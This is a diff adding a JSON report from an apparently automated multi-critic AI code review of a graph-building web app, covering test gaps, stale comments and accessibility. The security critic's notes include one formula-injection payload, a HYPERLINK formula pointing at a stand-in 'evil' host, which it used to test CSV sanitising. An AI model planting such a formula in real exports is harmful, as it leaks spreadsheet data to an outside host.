@@ -1,0 +1,416 @@
+{
+  "target": "app/src",
+  "round": 21,
+  "modelOverride": null,
+  "converged": false,
+  "counts": {
+    "gating": 7,
+    "confirmed": 7,
+    "blocking": 0,
+    "deferrals": 0,
+    "plausible": 1,
+    "themes": 6
+  },
+  "byCritic": [
+    {
+      "critic": "critic-correctness",
+      "model": "opus",
+      "nothingFound": false,
+      "findings": 5,
+      "checked": "",
+      "errored": false,
+      "erroredReason": null
+    },
+    {
+      "critic": "critic-security",
+      "model": "opus",
+      "nothingFound": true,
+      "findings": 0,
+      "checked": "Full-surface adversarial pass over /home/user/ringweave/app/src (all 40 files incl. io/, state/, panels/, graph/, worker/, model.ts, constraints.ts, neighborhood.ts, search.ts), with executable probes in /home/user/ringweave/.review-scratch/.\n\nCOST BEFORE COMMITMENT \u2014 traced every gate in importGraph.ts against the work it bounds: MAX_IMPORT_N before people.map; the density gate (2m <= BUDDY_MAX*n) before any per-edge loop; MAX_CONSTRAINT_PAIRS before readConstraints; per-name codePointsIfOver before any interpolation and before the joined-length check; joined-length before the round-trip parseRoster; degreeExtent before allPairsSummary. Every gate precedes its work. App.handleImportFile orders readFileText(size) -> checkJsonShape -> JSON.parse -> importGraph correctly.\n\nMEASURED (node, jiti): maximal legal file n=1000/m=6000 -> importGraph 127 ms. Adversarial shapes designed to defeat girth's triangle early-out: 1000-cycle 140 ms, path 88 ms, degree-12 bipartite girth-4 m=6000 256 ms. checkJsonShape on 8 MB of one number literal 91 ms / single string 89 ms / 400k structural chars 5 ms / 8 MB whitespace 73 ms, with JSON.parse 4-16 ms after. forceLayout swept n=120..1000 at max density: 159-256 ms, flat \u2014 the forceIters knee is a real budget. parseRoster at the 500k cap: 9.5 ms distinct, 16 ms dup chars, 78 ms for the degenerate max-token-density \"a\\n\"x250000; resolveNamedPairs+validateDetailed (incl. the core O(n^2) prohibited connectivity walk) at n=1000: 7.3 ms per keystroke.\n\nFUZZ: 40,000 structured mutations of a valid file (people[].name/id, edges, constraints, settings seeded with NaN, +/-Infinity, -0, 2^53, 1.5, null, lone surrogate, tab, comma, 200-char, [], {}, undefined). 7518 accepted, 32482 ImportError, 0 non-ImportError escapes. Every accepted GraphView held: no Cc/Cf/Zl/Zp/Cs in any name, no name over MAX_NAME_CHARS code points, degree <= BUDDY_MAX, settings.buddies integer in [BUDDY_MIN,BUDDY_MAX], integer seed, constraints <= MAX_CONSTRAINT_PAIRS, all numeric metrics finite, rows referencing real roster names, and exportGraph/JSON.stringify emitting null only for the deliberately nullable aspl/diameter/girth.\n\nNUMERIC EDGES: traced quality() for NaN \u2014 asplGap returns 0 when asplLb <= 0 and otherwise divides a finite aspl by a positive bound, and assembleMetrics gates on connected && isFinite(aspl), so quality cannot be NaN and qualityPercent/the conic-gradient percentage cannot be malformed. -0, non-integer n, Infinity all land on Number.isInteger/isFinite guards.\n\nSPREADSHEET/CLIPBOARD SINK: toCsv both RFC-4180-quotes and neutralizeCells every field, so an embedded ';' (European delimiter) cannot split a cell. A name provably cannot contain ',', '\\n', '\\t', '\\r', U+2028/9 or any Cc/Cf/Cs \u2014 parseRoster's [^\\n,]+ tokenizer plus importGraph's round-trip equality check makes any comma-bearing name unreproducible and therefore refused. I constructed a comma-free live formula (=HYPERLINK(\"http://evil\"&A1)) and walked it through BuddyList.copyAll: it can only occupy a non-leading position of a \", \"-joined run, so every comma-split field it could land in begins with a space, which defeats formula parsing in Excel/Sheets/Calc defaults. The leading-only neutralizeCell is sufficient on the present tree; no bypass constructed. Filenames are literals; no innerHTML/dangerouslySetInnerHTML/href/eval anywhere in app/src.\n\nMAIN-THREAD HANGS / DoS: checked checkJsonShape's depth counter for a negative-depth smuggle (possible only for input JSON.parse then rejects; for valid JSON counter == true depth), rankMatches (O(name) not O(needle*name) because `at` is monotonic), neighborhood O(d^2) with d <= BUDDY_MAX, useGraph/usePathFinder memo keys, useGenerationWorker's onerror/onmessageerror closing the \"stuck running with #app inert\" hole, useFocusRescue observing childList only, clampToPoints/clampText/clampList/clampNotice bounding every DOM text sink, MAX_HISTORY on the explorer stack.\n\nConsidered and deliberately NOT filed as padding: GraphCanvas's d3-zoom setZt re-renders all n nodes + m edges per input event with no size cap, while the layout tween immediately above is capped at ANIM_MAX_N=400 for the same cost \u2014 an asymmetry, but linear in a bounded n+m, interaction-driven rather than file-driven, and unmeasurable in a browser from here.",
+      "errored": false,
+      "erroredReason": null
+    },
+    {
+      "critic": "critic-solid",
+      "model": "sonnet",
+      "nothingFound": false,
+      "findings": 1,
+      "checked": "Traced the next actually-committed follow-on named in app/CLAUDE.md's \"Known follow-ons\": \"Buddy rules are not re-checked on import\" \u2014 the note prescribes the exact fix (export `buildReport`/equivalent from lib/src/core/index.ts, call it from app/src/io/importGraph.ts with `toConstraints`) and names the pinned test (app/test/importExport.roundtrip.test.ts). I performed the edit for real (not speculatively): exported `buildReport` from lib/src/core/index.ts, wired app/src/io/importGraph.ts to call `buildReport(g, toConstraints(n, constraints), summary.connected, false)`, updated the one pinned assertion, ran `npm run typecheck`/`npm run build` in lib, `npm run typecheck` and `npm test` in app (315/315 passing), then traced every remaining GraphView.report construction site (worker/generate.ts fromUnconstrained/fromConstrained, state/useBuddyGraph.ts, model.ts) to determine reachability of the `report === null` branch after the change. Reverted all edits afterward (git status clean, lib/dist rebuilt to match reverted source). Also spot-checked the app's declared OCP seam (GraphCanvas LAYOUT_MODES/FIT_MODES/positionsFor, exhaustive via assertNever) against the CLAUDE.md follow-on entry for a third (focus/ego) mode \u2014 already correctly filed there as a deferral with concrete unresolved blockers (clipping radii, snap-not-animate, undefined empty-focus state), so I did not re-file it.",
+      "errored": false,
+      "erroredReason": null
+    },
+    {
+      "critic": "critic-maintainability",
+      "model": "haiku",
+      "nothingFound": false,
+      "findings": 1,
+      "checked": "",
+      "errored": false,
+      "erroredReason": null
+    },
+    {
+      "critic": "critic-interaction",
+      "model": "sonnet",
+      "nothingFound": false,
+      "findings": 1,
+      "checked": "Traced the full keyboard/screen-reader path end to end against the actual scenario: cold load (App.tsx / RosterModal focus-on-mount), roster entry and file-drop/error paths (RosterModal, readFileText, parseRoster), generation dispatch and cancel/refuse/error recovery (useBuddyGraph, useGenerationWorker, useFocusRescue, the inert/#app containment asserted by appErrorRecovery.test.tsx), reading the quality numbers (QualityPanel, model.ts connectionSummary/qualityPercent), finding a person (PersonSearch combobox keyboard handling), reading buddies (PersonPanel, BuddyList, neighborhood.ts), path-finding (usePathFinder, PathPanel, pathStatusText live region), export (QualityPanel/download.ts), and the live-region wiring across App.tsx (busy-live, sr-live x2, Notice, RosterModal's note region, ConstraintsEditor's rule-note, BuddyList's copy-announce span, PersonSearch's search-empty region) for the \"exists before content changes\" invariant. Checked GraphCanvas's JS-driven tween against prefers-reduced-motion (respected via matchMedia guard) and the CSS wildcard `@media (prefers-reduced-motion: reduce) { * { transition: none !important; animation: none !important; } }`. Checked DOM order vs. absolute-position visual order across #rail/#toggle/#sidecol/#buddies/#search/#metrics. Checked every aria-pressed/aria-current/aria-disabled/aria-invalid usage for a toggle whose state changes without an accessible update (LayoutToggle, PersonPanel's \"Find a path\" button, BuddyList rows, SettingsControls stepper, ConstraintsEditor's add-rule cap). Checked focus destinations after every unmount (person panel close, path clear, rule-row delete, modal cancel/reopen, generation cancel) via useFocusRescue's anchor chain.",
+      "errored": false,
+      "erroredReason": null
+    }
+  ],
+  "skipped": [],
+  "saturationDecisions": [
+    {
+      "critic": "critic-correctness",
+      "streak": 0,
+      "gate": 3,
+      "surfaceTouched": true,
+      "ran": true,
+      "why": "below gate (0/3 quiet rounds)"
+    },
+    {
+      "critic": "critic-security",
+      "streak": 1,
+      "gate": 2,
+      "surfaceTouched": true,
+      "ran": true,
+      "why": "below gate (1/2 quiet rounds)"
+    },
+    {
+      "critic": "critic-solid",
+      "streak": 4,
+      "gate": 2,
+      "surfaceTouched": true,
+      "ran": true,
+      "why": "at gate (4) but a changed path is on its surface"
+    },
+    {
+      "critic": "critic-maintainability",
+      "streak": 4,
+      "gate": 2,
+      "surfaceTouched": true,
+      "ran": true,
+      "why": "at gate (4) but a changed path is on its surface"
+    },
+    {
+      "critic": "critic-interaction",
+      "streak": 0,
+      "gate": 2,
+      "surfaceTouched": true,
+      "ran": true,
+      "why": "below gate (0/2 quiet rounds)"
+    }
+  ],
+  "priorSaturationReceived": true,
+  "themes": [
+    {
+      "theme": "constraintSummary's null-report guard (model.ts) and QualityPanel's rendering of that guard are two independently-unverified layers of the same 'must never render as satisfied' promise \u2014 a string constructed at the model layer and consumed at the DOM layer with no test pinning either end or the seam between them",
+      "severity": "suggestion",
+      "critics": [
+        "critic-correctness",
+        "critic-correctness"
+      ],
+      "findingSummaries": [
+        "`constraintSummary` is referenced by zero tests at any level; its documented 'a null report must never render as satisfied' guarantee is unenforced, and inverting it passes the whole suite (model.ts).",
+        "No test in the suite renders QualityPanel, so the gauge, the connection caption and both shortfall disclosures \u2014 all downstream of constraintSummary and its siblings \u2014 are pinned only at the model layer and their wiring to the DOM is unguarded (QualityPanel.tsx); the finding text itself names QualityPanel as the 'sibling' gap of the constraintSummary gap."
+      ],
+      "remediation": "Tighten constraintSummary's `report === null` branch to return one explicit sentinel value (rather than a prose string downstream code matches by keyword) and make QualityPanel's satisfaction rendering key off that sentinel exclusively \u2014 collapsing the current two independently-unguarded obligations (model.ts's string construction and QualityPanel's consumption of it) into a single boundary check instead of leaving both unverified."
+    },
+    {
+      "theme": "model.ts's inline field comments (on `report` and `girth`) describe usage that has already drifted or is about to drift from what the code actually does, with no mechanism forcing the comment to track the code",
+      "severity": "suggestion",
+      "critics": [
+        "critic-solid",
+        "critic-maintainability"
+      ],
+      "findingSummaries": [
+        "Landing the already-scoped buildReport-on-import follow-on makes model.ts:130's `report === null` branch dead and the comment at model.ts:122-123 ('an imported constrained file has no report') false; verified by performing the wiring and tracing that report is null in only one unrelated case (model.ts).",
+        "Girth comment in model.ts understates M3 usage: it says girth is not displayed, but it is now used to derive `separationShortfall` shown in QualityPanel (model.ts)."
+      ],
+      "remediation": "Delete the free-form prose comments on the `report` and `girth` fields in model.ts (the 'saved with this graph \u2014 not re-checked on import' text and the 'not displayed' text) instead of maintaining separate documentation that can silently fall out of sync with actual consumers \u2014 let the field declarations stand alone, with the field's real usage (constraintSummary, separationShortfall) as the only source of truth."
+    },
+    {
+      "theme": "shortestPath is a direction-dependent primitive, and the lower-index canonicalisation that makes usePathFinder draw a symmetric route for (s,t) vs (t,s) is an untested, deletable invariant",
+      "severity": "suggestion",
+      "critics": [
+        "critic-correctness"
+      ],
+      "findingSummaries": [
+        "`shortestPath` returns different (equally short) routes for (s,t) and (t,s); the lower-index canonicalisation that makes 'Ana then Ben' draw the same line as 'Ben then Ana' is deleteable with the whole suite green (usePathFinder.ts)."
+      ],
+      "remediation": "Tighten shortestPath itself to always canonicalise (lower-index first) internally before searching, and delete the separate post-hoc reorientation step in usePathFinder \u2014 unifying the forward and reverse query call sites onto one code path removes the untested asymmetry instead of adding a test to guard it."
+    },
+    {
+      "theme": "neighborhood.ts's chip-bucket projection (relatedChips) and its '+N more' counter independently decide what counts as shown vs hidden, so the two can silently disagree or double-count without any test noticing",
+      "severity": "suggestion",
+      "critics": [
+        "critic-correctness"
+      ],
+      "findingSummaries": [
+        "Two membership/counting properties of neighborhood/relatedChips that PersonPanel renders directly are unpinned \u2014 focus-exclusion and shown+hidden-equals-total \u2014 and both mutations pass the suite (neighborhood.ts)."
+      ],
+      "remediation": "Delete relatedChips' own slicing/counting logic and have it call the existing clampList boundary check directly, so there is exactly one place that decides the shown/hidden split instead of two independently-maintained boundary checks that can drift apart."
+    },
+    {
+      "theme": "a defensive clamp in App.tsx is justified by a causal story (async ordering vs resetSelection) that cannot be reproduced, so the comment asserts a hazard the code's own structure appears to exclude",
+      "severity": "suggestion",
+      "critics": [
+        "critic-correctness"
+      ],
+      "findingSummaries": [
+        "The comment above the `selected` range clamp in App.tsx claims a selection can survive into a shorter replacement view because resetSelection runs before the asynchronous bg.generate; this window could not be reproduced, and deleting the clamp passes the suite."
+      ],
+      "remediation": "Delete the unreproducible causal claim from the App.tsx comment rather than keeping a justification nobody can reconstruct; the real defense is eccentricity's own vertex guard downstream, so state only that dependency \u2014 removing the false narrative instead of adding a test to validate it."
+    },
+    {
+      "theme": "the connection-quality gauge's only explanation of what its number means lives solely in a mouse-hover `title` attribute on a non-focusable div, so keyboard/screen-reader users get a bare, unit-less digit disconnected from the adjacent caption text that could have carried the explanation",
+      "severity": "suggestion",
+      "critics": [
+        "critic-interaction"
+      ],
+      "findingSummaries": [
+        "QualityPanel's gauge explanation ('how close to the theoretical best...') is only in a `title` attribute on a non-focusable div; the visible number has no '%' unit, and connectionSummary's adjacent text never restates the number or the word 'quality'/'percent', so the number and its meaning are never connected for non-mouse users."
+      ],
+      "remediation": "Remove the split between the hidden tooltip and the separate caption \u2014 fold the gauge's meaning directly into the existing connectionSummary text so there is one accessible text channel instead of two disconnected ones, rather than bolting on a new aria-label element alongside the tooltip."
+    }
+  ],
+  "gating": [
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "unguarded-satisfaction-claim",
+      "theme": "the only sentence that tells the organizer whether their buddy rules were honored is verified by nothing, so \"not measured\" can silently become \"satisfied\"",
+      "file": "app/src/model.ts",
+      "line": 130,
+      "summary": "`constraintSummary` is referenced by zero tests at any level; its documented \"a null report must never render as satisfied\" guarantee is unenforced, and inverting it passes the whole suite.",
+      "failure": "Seeded mutation: change `model.ts:130` from ``if (report === null) return `${rules} saved with this graph \u2014 not re-checked on import.`;`` to ``if (report === null) return `all ${rules} satisfied`;``. `npm test` \u2192 315 passed. Reachable input: import any exported file carrying buddy rules (`importGraph` sets `report: null` because no builder ran) \u2192 QualityPanel would tell the organizer all N rules were honored when nothing checked a single edge. Two further mutations are also green: dropping the `broken === 0` guard (`return \"all N satisfied\"` whatever the violation counts), and making `constraintSummary` return `null` always (the rules line vanishes from the panel). `grep -rn constraintSummary app/test/` returns nothing; `importExport.roundtrip.test.ts:382` pins `view.report === null`, i.e. the field, not the string derived from it.",
+      "remediation": "Add a test over `constraintSummary` covering all three branches by their OUTPUT string, not the field: (a) `report === null` with `constraints.length > 0` must not match /satisfied/; (b) a report with `reqViolations + prohViolations > 0` must not match /satisfied/; (c) `constraints.length === 0` returns null. Assert (a) through the real import path (`importGraph(exportGraph(constrainedView))`) so the seam, not just the function, is pinned. Name the sibling in the same commit: `QualityPanel` is where the string is rendered and has no render test either (filed separately).",
+      "invariant": "For every GraphView v, `/satisfied/.test(constraintSummary(v) ?? \"\") === (v.report !== null && v.report.reqViolations + v.report.prohViolations === 0 && v.constraints.length > 0)` \u2014 i.e. the word \"satisfied\" appears if and only if a report exists AND counts zero violations."
+    },
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "untested-display-wiring",
+      "theme": "the metrics panel derives truths from the model that no test ever reads, so any disclosure it owns can be deleted without failing",
+      "file": "app/src/panels/QualityPanel.tsx",
+      "line": 43,
+      "summary": "No test in the suite renders QualityPanel, so the gauge, the connection caption and both shortfall disclosures are pinned only at the model layer and their wiring to the DOM is unguarded.",
+      "failure": "`grep -rln \"QualityPanel|Connection quality|avg hops|in Settings\" app/test/` \u2192 no matches. Seeded mutations, each green across 315 tests: (1) `{shortfall && (` \u2192 `{false && shortfall && (` \u2014 the line \"Each person has 3 buddies, not the 4 in Settings\" disappears, so a roster that silently received fewer buddies than asked ships with no disclosure; (2) `{separation && (` \u2192 `{false && separation && (` \u2014 the delivered-separation disclosure disappears, which is the only place the core's routine demotion of `minSeparation` surfaces. The model-level functions `targetShortfall`/`separationShortfall` are well tested in `quality.test.ts`; nothing asserts the panel consumes them.",
+      "remediation": "Add one render test for QualityPanel driven from a real `viewFromResult`/`importGraph` view: assert the gauge text equals `String(qualityPercent(m))`, the caption equals `connectionSummary(m)`, and that the shortfall lines are present exactly when `targetShortfall(view)`/`separationShortfall(view)` are non-null (and absent when they are null \u2014 a disclosure that always renders is not a disclosure). Drive it off the model functions rather than literal strings so it pins the wiring, not the copy.",
+      "invariant": "For every GraphView v, the rendered QualityPanel text contains `String(qualityPercent(v.metrics))` and `connectionSummary(v.metrics)`, and contains a shortfall line if and only if `targetShortfall(v) !== null` (resp. `separationShortfall(v) !== null`)."
+    },
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "unpinned-tie-break",
+      "theme": "a path is reconstructed from a direction-dependent core primitive, and the tie-break that makes the drawn chain symmetric is load-bearing but untested",
+      "file": "app/src/state/usePathFinder.ts",
+      "line": 22,
+      "summary": "`shortestPath` returns different (equally short) routes for (s,t) and (t,s); the lower-index canonicalisation that makes \"Ana then Ben\" draw the same line as \"Ben then Ana\" is deleteable with the whole suite green.",
+      "failure": "Measured: on four app-generated graphs (n=12/k=3, 16/3, 20/4, 30/4, seed 12345) there are 98 pairs where `shortestPath(g,s,t)` reversed !== `shortestPath(g,t,s)` \u2014 e.g. n=12 k=3, 1\u219410 gives [1,2,8,10] one way and [1,6,0,10] the other. Seeded mutation `const [s, t] = [source, target];` (dropping the canonicalisation at line 22): `npm test` \u2192 315 passed. With it removed, picking two people in the opposite order lights a different chain in the graph, in PathPanel's chips, and in the always-mounted `sr-live` region, with the same step count \u2014 the docstring's stated contract, unenforced.",
+      "remediation": "Add a property test over `usePathFinder` (or its pure core: canonicalise \u2192 `shortestPath` \u2192 orient) that, for a generated graph and every reachable pair, the route for (a,b) is the exact reverse of the route for (b,a) and `route[0] === source`. Quantify over all pairs of one real graph rather than listing pairs, since the asymmetry is data-dependent.",
+      "invariant": "For every graph g and all a \u2260 b in [0,g.n): with source=a,target=b the resolved route R1 and with source=b,target=a the resolved route R2 satisfy `R1 === null ? R2 === null : (R1[0] === a && R2[0] === b && R1.join() === [...R2].reverse().join())`."
+    },
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "untested-projection-boundary",
+      "theme": "the explorer card's chip projection and its \"+N more\" counter can disagree with each other, or list a person as two steps from themselves, without any test noticing",
+      "file": "app/src/neighborhood.ts",
+      "line": 22,
+      "summary": "Two membership/counting properties of `neighborhood`/`relatedChips` that PersonPanel renders directly are unpinned; both mutations pass the suite.",
+      "failure": "Seeded mutations, each green across 315 tests: (1) drop `c !== focus` at `neighborhood.ts:22` \u2014 the focused person enters `second`, so PersonPanel renders them as their own \"Two steps away\" chip and `isShownRelated(adj, i, i)` becomes true, changing the back-stack trail rule; (2) `all.slice(0, SECOND_LIMIT)` \u2192 `all.slice(0, SECOND_LIMIT + 1)` at `neighborhood.ts:51` \u2014 25 chips render while `secondHidden` still counts `length - 24`, so one person is both shown and counted in \"+N more\" and the displayed count is off by one. Second-degree sets reach 132 at the degree cap, so the cutoff is live, not theoretical. A related boundary in the same class: `clamp.ts:54` `items.length <= limit` \u2192 `<` also survives, which would make a person with exactly 12 buddies announce as \"\u2026, and 0 more\" through `selectionStatusText`.",
+      "remediation": "Pin the projection's two structural properties over a generated graph and every focus index: focus is in neither bucket, the buckets are disjoint, and shown + hidden equals the full two-step count. Add the `clampList` equality boundary (`items.length === limit` renders no \"and N more\") in the same commit \u2014 same theme, one delimiter over.",
+      "invariant": "For every adjacency and every focus i: `!first.has(i) && !second.has(i)`, `first` and `second` are disjoint, and `relatedChips(adj,i).secondShown.length + relatedChips(adj,i).secondHidden === neighborhood(adj,i).second.size`; and for all items/limit, `clampList(items, limit)` contains \"and 0 more\" for no input."
+    },
+    {
+      "critic": "critic-solid",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "orphaned-invariant-comment",
+      "theme": "the fact 'report is null on the import path' is asserted independently in two files (importGraph.ts's construction and model.ts's consumption) with no shared symbol tying them together, so fixing the producer silently strands the consumer's comment and copy",
+      "file": "app/src/model.ts",
+      "line": 122,
+      "summary": "Implementing the follow-on this project has actually committed to (re-check buddy rules on import, using the core's own buildReport rather than a hand-rolled copy of the satisfaction predicate \u2014 exactly as prescribed in app/CLAUDE.md's 'Known follow-ons') makes model.ts:130's `report === null` branch dead in the live call graph, and turns the comment at model.ts:122-123 ('an imported constrained file has no report') false. I verified this by actually performing the wiring: after the fix, GraphView.report is null in exactly two situations \u2014 fromUnconstrained() in worker/generate.ts (reached only when there are zero constraints, so QualityPanel's `constraintSummary` already short-circuits on `total === 0` before ever reading `report`) and nowhere else, since fromConstrained() and the fixed importGraph.ts both always populate `report` whenever constraints exist. That leaves `constraintSummary`'s 'saved with this graph \u2014 not re-checked on import' string, and the comment explaining it, permanently unreachable from real data.",
+      "failure": "Import a file with constraints (e.g. `{required:[[0,1]]}`) after the fix and read the quality panel: it now correctly says 'all 1 buddy rule satisfied' (a genuine improvement), but model.ts:122-123's comment still claims imported files have no report, and the dead `report === null` branch/string remain, so a future reader trusts a comment the fix itself invalidated.",
+      "remediation": "When landing the buildReport wiring (importGraph.ts + lib export), remove or rewrite model.ts:119-134's comment and the now-unreachable `report === null` branch in the same commit, rather than leaving it to a later comment sweep \u2014 the fan-out for this follow-on is three files (lib/src/core/index.ts, app/src/io/importGraph.ts, app/src/model.ts), not the two the follow-on note names.",
+      "invariant": "for every GraphView v with v.constraints.length > 0 that is reachable from a real code path (generation or import), v.report !== null \u2014 i.e. `report === null && constraints.length > 0` is unreachable, so any UI string/comment keyed on that condition is dead and must not exist",
+      "caseOnly": false
+    },
+    {
+      "critic": "critic-maintainability",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "stale-comment",
+      "theme": "comment claims girth is not displayed when it is now used to derive displayed separation information",
+      "file": "/home/user/ringweave/app/src/model.ts",
+      "line": 67,
+      "summary": "Girth comment understates M3 usage: it is now displayed via separationShortfall.",
+      "failure": "Line 67 states: 'girth: number | null; // export-only (meta.metrics); not displayed in M2; null for a forest'. However, girth IS now displayed in M3: the separationShortfall() function (lines 255\u2013263) derives the displayed separation value directly from girth (got = girth - 1), and QualityPanel (lines 53\u201357 in QualityPanel.tsx) displays this shortfall to the user.",
+      "remediation": "Update the comment to reflect M3 usage: 'girth: number | null; // derived to show minimum-separation shortfall in QualityPanel; null for a forest'. Alternatively, remove the version reference entirely and state only the current usage.",
+      "invariant": "For any graph view where girth !== null and constraints.length === 0, separationShortfall must return a non-null result when got < asked, and this result must be rendered in the UI. The girth value is the ONLY source of truth for separation reporting (postulate: separation = girth - 1 per the core's own definition).",
+      "caseOnly": false
+    },
+    {
+      "critic": "critic-interaction",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "mouse-only-explanation",
+      "theme": "a value's meaning is explained only through a pointer-hover mechanism, so a keyboard/screen-reader user reading the quality numbers gets a bare, unit-less digit with no way to learn what it measures",
+      "file": "app/src/panels/QualityPanel.tsx",
+      "line": 34,
+      "summary": "The connection-quality gauge's only explanation of what its number means ('how close to the theoretical best (Moore bound) this graph is. Zero when the group is split into disconnected sub-groups.') lives entirely in a `title` attribute on a non-focusable `<div className=\"gauge\">`. `title` is a mouse-hover tooltip; it is not exposed to keyboard users (the div has no `tabIndex`, so it can never receive focus and browsers generally do not surface `title` outside of a mouse hover/focus event) and most screen readers do not read `title` on non-interactive, unfocused elements at all. The visible number itself (`<div className=\"inner tabnum\">{q}</div>`) carries no unit either \u2014 no '%' character in the markup \u2014 so a screen reader lands on a bare integer with no indication it is a percentage or what it is a percentage of; the adjacent `connectionSummary` text ('everyone's well-linked for 4 buddies each' / 'not enough people yet to score') never restates the number or the word 'quality'/'percent', so the number and its explanation are never connected for anyone not sighted enough to read the tooltip.",
+      "failure": "A screen-reader user tabbing (or reading in document order with the screen off) through the metrics band after generating a graph hears, for the quality metric: the digits (e.g. '82') then 'everyone's well-linked for 4 buddies each' \u2014 with no announcement anywhere of the word 'percent', 'quality', or the Moore-bound explanation a sighted user can get by hovering the gauge. Contrast with the two neighboring metrics on the same panel, `aspl` and `diameter`, each of which pairs its number with an explicit label ('avg hops between any two people', 'most steps between anyone') in the accessible tree.",
+      "remediation": "Move the explanatory sentence (or a shorter equivalent, e.g. `${q}% connection quality \u2014 how close to the theoretical best for this many buddies`) into an `aria-label` on the `.gauge` div (or a visually-hidden text node inside it) so it is present in the accessible tree unconditionally, the same way `aspl`/`diameter` already pair their digits with a text label; keep `title` for the mouse tooltip if desired, but don't make it the only channel.",
+      "invariant": "Every piece of information exposed via a `title` attribute on a non-focusable element must also be reachable via the accessible name, accessible description, or an adjacent static/live text node of that element \u2014 i.e. no user-facing explanation should be reachable by pointer hover alone."
+    }
+  ],
+  "confirmed": [
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "unguarded-satisfaction-claim",
+      "theme": "the only sentence that tells the organizer whether their buddy rules were honored is verified by nothing, so \"not measured\" can silently become \"satisfied\"",
+      "file": "app/src/model.ts",
+      "line": 130,
+      "summary": "`constraintSummary` is referenced by zero tests at any level; its documented \"a null report must never render as satisfied\" guarantee is unenforced, and inverting it passes the whole suite.",
+      "failure": "Seeded mutation: change `model.ts:130` from ``if (report === null) return `${rules} saved with this graph \u2014 not re-checked on import.`;`` to ``if (report === null) return `all ${rules} satisfied`;``. `npm test` \u2192 315 passed. Reachable input: import any exported file carrying buddy rules (`importGraph` sets `report: null` because no builder ran) \u2192 QualityPanel would tell the organizer all N rules were honored when nothing checked a single edge. Two further mutations are also green: dropping the `broken === 0` guard (`return \"all N satisfied\"` whatever the violation counts), and making `constraintSummary` return `null` always (the rules line vanishes from the panel). `grep -rn constraintSummary app/test/` returns nothing; `importExport.roundtrip.test.ts:382` pins `view.report === null`, i.e. the field, not the string derived from it.",
+      "remediation": "Add a test over `constraintSummary` covering all three branches by their OUTPUT string, not the field: (a) `report === null` with `constraints.length > 0` must not match /satisfied/; (b) a report with `reqViolations + prohViolations > 0` must not match /satisfied/; (c) `constraints.length === 0` returns null. Assert (a) through the real import path (`importGraph(exportGraph(constrainedView))`) so the seam, not just the function, is pinned. Name the sibling in the same commit: `QualityPanel` is where the string is rendered and has no render test either (filed separately).",
+      "invariant": "For every GraphView v, `/satisfied/.test(constraintSummary(v) ?? \"\") === (v.report !== null && v.report.reqViolations + v.report.prohViolations === 0 && v.constraints.length > 0)` \u2014 i.e. the word \"satisfied\" appears if and only if a report exists AND counts zero violations."
+    },
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "untested-display-wiring",
+      "theme": "the metrics panel derives truths from the model that no test ever reads, so any disclosure it owns can be deleted without failing",
+      "file": "app/src/panels/QualityPanel.tsx",
+      "line": 43,
+      "summary": "No test in the suite renders QualityPanel, so the gauge, the connection caption and both shortfall disclosures are pinned only at the model layer and their wiring to the DOM is unguarded.",
+      "failure": "`grep -rln \"QualityPanel|Connection quality|avg hops|in Settings\" app/test/` \u2192 no matches. Seeded mutations, each green across 315 tests: (1) `{shortfall && (` \u2192 `{false && shortfall && (` \u2014 the line \"Each person has 3 buddies, not the 4 in Settings\" disappears, so a roster that silently received fewer buddies than asked ships with no disclosure; (2) `{separation && (` \u2192 `{false && separation && (` \u2014 the delivered-separation disclosure disappears, which is the only place the core's routine demotion of `minSeparation` surfaces. The model-level functions `targetShortfall`/`separationShortfall` are well tested in `quality.test.ts`; nothing asserts the panel consumes them.",
+      "remediation": "Add one render test for QualityPanel driven from a real `viewFromResult`/`importGraph` view: assert the gauge text equals `String(qualityPercent(m))`, the caption equals `connectionSummary(m)`, and that the shortfall lines are present exactly when `targetShortfall(view)`/`separationShortfall(view)` are non-null (and absent when they are null \u2014 a disclosure that always renders is not a disclosure). Drive it off the model functions rather than literal strings so it pins the wiring, not the copy.",
+      "invariant": "For every GraphView v, the rendered QualityPanel text contains `String(qualityPercent(v.metrics))` and `connectionSummary(v.metrics)`, and contains a shortfall line if and only if `targetShortfall(v) !== null` (resp. `separationShortfall(v) !== null`)."
+    },
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "unpinned-tie-break",
+      "theme": "a path is reconstructed from a direction-dependent core primitive, and the tie-break that makes the drawn chain symmetric is load-bearing but untested",
+      "file": "app/src/state/usePathFinder.ts",
+      "line": 22,
+      "summary": "`shortestPath` returns different (equally short) routes for (s,t) and (t,s); the lower-index canonicalisation that makes \"Ana then Ben\" draw the same line as \"Ben then Ana\" is deleteable with the whole suite green.",
+      "failure": "Measured: on four app-generated graphs (n=12/k=3, 16/3, 20/4, 30/4, seed 12345) there are 98 pairs where `shortestPath(g,s,t)` reversed !== `shortestPath(g,t,s)` \u2014 e.g. n=12 k=3, 1\u219410 gives [1,2,8,10] one way and [1,6,0,10] the other. Seeded mutation `const [s, t] = [source, target];` (dropping the canonicalisation at line 22): `npm test` \u2192 315 passed. With it removed, picking two people in the opposite order lights a different chain in the graph, in PathPanel's chips, and in the always-mounted `sr-live` region, with the same step count \u2014 the docstring's stated contract, unenforced.",
+      "remediation": "Add a property test over `usePathFinder` (or its pure core: canonicalise \u2192 `shortestPath` \u2192 orient) that, for a generated graph and every reachable pair, the route for (a,b) is the exact reverse of the route for (b,a) and `route[0] === source`. Quantify over all pairs of one real graph rather than listing pairs, since the asymmetry is data-dependent.",
+      "invariant": "For every graph g and all a \u2260 b in [0,g.n): with source=a,target=b the resolved route R1 and with source=b,target=a the resolved route R2 satisfy `R1 === null ? R2 === null : (R1[0] === a && R2[0] === b && R1.join() === [...R2].reverse().join())`."
+    },
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "untested-projection-boundary",
